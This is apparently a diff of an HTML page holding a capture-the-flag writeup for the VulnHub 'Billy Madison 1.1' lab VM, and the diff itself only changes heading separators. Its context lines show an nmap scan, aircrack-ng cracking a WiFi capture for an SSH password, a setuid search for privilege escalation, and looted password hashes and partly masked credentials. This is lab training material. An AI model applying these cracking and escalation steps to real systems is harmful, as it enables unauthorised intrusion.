@@ -26,7 +26,7 @@
           <p style="float:left;"><a href="/posts/20190831_vulnhub-brainpan.html"> « </a>📅 published on <code>05/Sep/2019</code><a href="/posts/20190909_vulnhub-bsidesvancouver2018workshop.html"> » </a></p>
         <p style="float:right;">🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
     <div style="clear:both;"></div>
-    <br/><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
 <p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/billy-madison-11,161">Billy Madison: 1.1</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
 <p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_billymadison1dot1/machinescli.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
@@ -34,7 +34,7 @@
 <p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_billymadison1dot1/killchain.png.webp" /></p>
 <h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
 <p class="nested">1. <code>1974/tcp</code>: <a href="https://github.com/7h3rAm/writeups#privesc_setuid">privesc_setuid</a>, <a href="https://github.com/7h3rAm/writeups#privesc_cron">privesc_cron</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
 <p class="nested">1. Here's the Nmap scan result:  </p>
 <pre class="nested"><code># Nmap 7.70 scan initiated Thu Sep  5 17:45:50 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/_quick_tcp_nmap.txt -oX /root/toolbox/vulnhub/billymadison1dot1/results/192.168.92.167/scans/xml/_quick_tcp_nmap.xml 192.168.92.167
 Nmap scan report for 192.168.92.167
@@ -157,7 +157,7 @@ http://192.168.92.167/exschmenuating/012987veronica.cap
 <h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
 <pre class="nested"><code>ssh: eric, veronica
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
 <p class="nested">1. From the storyline so far, user <code>eric</code> has reused WiFi password for SSH login. We need to extract the WiFi password from <code>eg-01.cap</code> file. We run an <code>aircrack</code> scan on the file and get SSH password:  </p>
 <pre class="nested"><code>aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt → triscuit*
 </code></pre>
@@ -166,7 +166,7 @@ http://192.168.92.167/exschmenuating/012987veronica.cap
 <pre class="nested"><code>ssh -p1974 eric@192.168.92.167
 </code></pre>
 <p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_billymadison1dot1/writeup.exploitation.screenshot.png.webp" />  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
 <pre class="nested"><code>eric@BM&gt; id
 uid=1002(eric) gid=1002(eric) groups=1002(eric)
 eric@BM&gt;  
@@ -187,7 +187,7 @@ billy
 veronica
 eric
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
 <p class="nested">1. While searching for <code>setuid</code> files we see an uncommon binary:  </p>
 <pre class="nested"><code>find / -type f -perm -04000 2&gt;/dev/null → /usr/local/share/sgml/donpcgd
 </code></pre>
@@ -218,7 +218,7 @@ scp -p1974 eric@192.168.92.167:/home/eric/hints.txt ./
 </code></pre>
 <p class="nested"><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_billymadison1dot1/screenshot17.png.webp" />  </p>
 <p class="nested">8. Mounting the decrypted <code>BowelMovement</code> file reveals a partition with <code>secret.zip</code> that contains both <code>Billy_Madison_12th_Grade_Final_Project.doc</code> and <code>THE-END.txt</code> files.  </p>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
 <h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
 <pre class="nested"><code>billy:$6$eqJNxIDh$oO.ynkHZmLxfr0k8YXHHdbyB4boe2two4HnEiJzzuVEUh0w0paEtVCmHXziHhZIet71QcLqhqnV/iknE/........................
 veronica:$6$ud4650Og$j9dN4Xh6nHTDUQ5LpnrUzl6FdRiapcGvjg0JU2/Wx.G5Q.PFtbv.sa4OJyNnzTVsFEMmgnEZQV1nxGFiy........................
@@ -229,7 +229,7 @@ eric:$6$b15/PaMU$VKQussKbrXty79HD4A989SVCn.7.u6bJLMvsFgDSgiM01GlyM/lhb1xF0RcX906
 ssh: eric/triscu...
 truecrypt: execrab..
 </code></pre>
-<br/><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
 <ul class="nested">
 <li><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">https://www.vulnhub.com/entry/billy-madison-11,161/</a>  </li>
 <li><a href="https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/">https://g0blin.co.uk/billy-madison-1-vulnhub-writeup/</a>  </li>
